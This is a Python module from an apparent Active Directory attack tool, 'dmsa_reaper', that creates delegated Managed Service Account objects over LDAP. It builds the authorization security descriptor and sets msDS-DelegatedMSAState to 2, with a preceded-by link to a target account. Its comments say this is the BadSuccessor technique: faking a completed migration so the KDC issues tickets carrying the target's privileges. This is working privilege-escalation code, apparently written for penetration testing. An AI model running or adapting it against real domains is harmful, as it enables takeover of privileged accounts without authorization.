from __future__ import annotations

import os

from ldap3 import BASE, Connection
from impacket.ldap import ldaptypes

from dmsa_reaper.ldap.query import ensure_search_succeeded
from dmsa_reaper.ldap.sid import entry_sid
from dmsa_reaper.models import Operation
from dmsa_reaper.utils import bytes_to_guid_le

DMSA_OBJECT_CLASSES = [
    "top",
    "person",
    "organizationalPerson",
    "user",
    "computer",
    "msDS-DelegatedManagedServiceAccount",
]

# userAccountControl = WORKSTATION_TRUST_ACCOUNT (4096)
DMSA_UAC = 4096

# msDS-ManagedPasswordInterval: managed password rotation period in days.
# 30 matches the Microsoft schema default for msDS-ManagedServiceAccount.
DMSA_MANAGED_PASSWORD_INTERVAL = 30

# RC4_HMAC | AES128_CTS_HMAC_SHA1_96 | AES256_CTS_HMAC_SHA1_96.
# This matches the account shape emitted by the Impacket/BloodyAD dMSA
# engagement implementations while still allowing an AES-only KDC to choose
# either AES enctype.
DMSA_SUPPORTED_ENCRYPTION_TYPES = 0x1C

# msDS-DelegatedMSAState values used by the directory protocol.
#   0 = unknown / not set
#   1 = migration in progress
#   2 = migration completed  ← use for BadSuccessor-style simulated migration
#   3 = standalone dMSA (no preceding account)
#
# The BadSuccessor technique simulates a *completed* migration by writing
# msDS-DelegatedMSAState = 2 directly, bypassing the official RootDSE operation.
# The KDC checks this value when deciding whether to issue PAC-inheriting tickets.
DMSA_STATE_UNKNOWN = 0
DMSA_STATE_IN_PROGRESS = 1
DMSA_STATE_COMPLETED = 2
DMSA_STATE_STANDALONE = 3


def build_group_msa_membership_sd_for_sids(principal_sids: list[str]) -> bytes:
    """Build a dMSA authorization descriptor for one or more SIDs.

    msDS-GroupMSAMembership is itself a self-relative security descriptor.  The
    KDC uses it to decide whether a principal requesting a dMSA key package is
    authorized.  The 0x000F01FF mask deliberately expands GenericAll into its
    specific rights.  The dMSA KDC authorization path does not expand the GA
    generic-right bit, so using 0x10000000 here results in KDC_ERR_POLICY.

        O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID>)
    """
    unique_sids = list(dict.fromkeys(principal_sids))
    if not unique_sids:
        raise ValueError("at least one authorization SID is required")
    for principal_sid in unique_sids:
        if not principal_sid or not principal_sid.upper().startswith("S-"):
            raise ValueError(f"invalid dMSA authorization SID: {principal_sid!r}")

    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    # SE_SELF_RELATIVE | SE_DACL_PRESENT.
    sd["Control"] = 0x8004

    owner = ldaptypes.LDAP_SID()
    owner.fromCanonical("S-1-5-32-544")  # BUILTIN\Administrators
    sd["OwnerSid"] = owner
    sd["GroupSid"] = b""
    sd["Sacl"] = b""

    acl = ldaptypes.ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []

    for principal_sid in unique_sids:
        ace = ldaptypes.ACE()
        ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        ace["AceFlags"] = 0
        allowed = ldaptypes.ACCESS_ALLOWED_ACE()
        allowed["Mask"] = ldaptypes.ACCESS_MASK()
        allowed["Mask"]["Mask"] = 0x000F01FF
        allowed["Sid"] = ldaptypes.LDAP_SID()
        allowed["Sid"].fromCanonical(principal_sid)
        ace["Ace"] = allowed
        acl.aces.append(ace)
    sd["Dacl"] = acl
    return sd.getData()


def build_group_msa_membership_sd(principal_sid: str) -> bytes:
    """Backward-compatible single-principal authorization descriptor."""
    return build_group_msa_membership_sd_for_sids([principal_sid])


def build_dmsa_creation_attributes(
    *,
    cn: str,
    domain: str,
    principal_sid: str,
    target_dn: str,
) -> dict[str, object]:
    """Return the common, ticket-capable attributes for a new dMSA."""
    dns_domain = domain.strip().strip(".").lower()
    if not dns_domain:
        raise ValueError("domain is required to construct the dMSA DNS hostname")
    return {
        "sAMAccountName": f"{cn}$",
        "dNSHostName": f"{cn.lower()}.{dns_domain}",
        "userAccountControl": DMSA_UAC,
        "msDS-ManagedPasswordInterval": DMSA_MANAGED_PASSWORD_INTERVAL,
        "msDS-GroupMSAMembership": build_group_msa_membership_sd(principal_sid),
        "msDS-DelegatedMSAState": DMSA_STATE_COMPLETED,
        "msDS-ManagedAccountPrecededByLink": target_dn,
        "msDS-SupportedEncryptionTypes": DMSA_SUPPORTED_ENCRYPTION_TYPES,
    }


def generate_dmsa_name(hint: str | None = None) -> str:
    """Return a unique dMSA CN using a random 3-byte suffix."""
    suffix = os.urandom(3).hex()
    base = hint.rstrip("$") if hint else "dmsarpr"
    return f"{base}-{suffix}"


def dmsa_dn(cn: str, container_dn: str) -> str:
    return f"CN={cn},{container_dn}"


def resolve_meta(meta: dict, *keys: str) -> str | None:
    """Read a value from direct metadata keys or the nested 'path' dict."""
    for key in keys:
        val = meta.get(key)
        if val is not None:
            return val
    path = meta.get("path")
    if isinstance(path, dict):
        for key in keys:
            val = path.get(key)
            if val is not None:
                return val
    return None


def read_attribute(conn: Connection, dn: str, attribute: str) -> list | None:
    """Read a single attribute from LDAP.

    Returns a list of raw values or None when the attribute is absent/object not found.
    """
    ok = conn.search(
        search_base=dn,
        search_filter="(objectClass=*)",
        search_scope=BASE,
        attributes=[attribute],
    )
    ensure_search_succeeded(conn, ok, f"read {attribute!r} on {dn!r}")
    if not conn.entries:
        return None
    entry = conn.entries[0]
    if attribute not in entry:
        return None
    vals = entry[attribute].values
    return list(vals) if vals else None


def read_raw_attribute(conn: Connection, dn: str, attribute: str) -> list | None:
    """Read an LDAP attribute without schema-driven binary coercion."""
    ok = conn.search(
        search_base=dn,
        search_filter="(objectClass=*)",
        search_scope=BASE,
        attributes=[attribute],
    )
    ensure_search_succeeded(conn, ok, f"read raw {attribute!r} on {dn!r}")
    if not conn.entries:
        return None
    entry = conn.entries[0]
    if attribute not in entry:
        return None
    attr = entry[attribute]
    raw_values = getattr(attr, "raw_values", None)
    if raw_values:
        return list(raw_values)
    values = getattr(attr, "values", None)
    return list(values) if values else None


def read_object_guid(conn: Connection, dn: str) -> str:
    """Read the server-assigned objectGUID immediately after object creation."""
    ok = conn.search(
        search_base=dn,
        search_filter="(objectClass=*)",
        search_scope=BASE,
        attributes=["objectGUID"],
    )
    ensure_search_succeeded(conn, ok, f"read objectGUID on {dn!r}")
    if not conn.entries:
        raise RuntimeError(f"created object cannot be re-read for GUID journaling: {dn}")
    entry = conn.entries[0]
    if "objectGUID" not in entry:
        raise RuntimeError(f"created object has no readable objectGUID: {dn}")
    attr = entry["objectGUID"]
    raw_values = getattr(attr, "raw_values", None) or []
    if raw_values and isinstance(raw_values[0], (bytes, bytearray)):
        raw = bytes(raw_values[0])
        if len(raw) == 16:
            return bytes_to_guid_le(raw)
    value = getattr(attr, "value", None)
    if value:
        return str(value).lower()
    values = getattr(attr, "values", None) or []
    if values:
        return str(values[0]).lower()
    raise RuntimeError(f"created object has an empty objectGUID: {dn}")


def read_object_sid(conn: Connection, dn: str) -> str:
    """Read the server-assigned objectSid for a newly created security principal."""
    ok = conn.search(
        search_base=dn,
        search_filter="(objectClass=*)",
        search_scope=BASE,
        attributes=["objectSid"],
    )
    ensure_search_succeeded(conn, ok, f"read objectSid on {dn!r}")
    if not conn.entries:
        raise RuntimeError(f"created object cannot be re-read for SID journaling: {dn}")
    entry = conn.entries[0]
    if "objectSid" not in entry:
        raise RuntimeError(f"created object has no readable objectSid: {dn}")
    sid = entry_sid(entry["objectSid"])
    if not sid:
        raise RuntimeError(f"created object has an empty objectSid: {dn}")
    return sid


def journal_created_object(operation: Operation, conn: Connection, dn: str) -> str:
    """Bind a created DN to its immutable GUID before later writes continue."""
    guid = read_object_guid(conn, dn)
    operation.metadata.setdefault("created_objects", {})[dn] = {"object_guid": guid}
    return guid
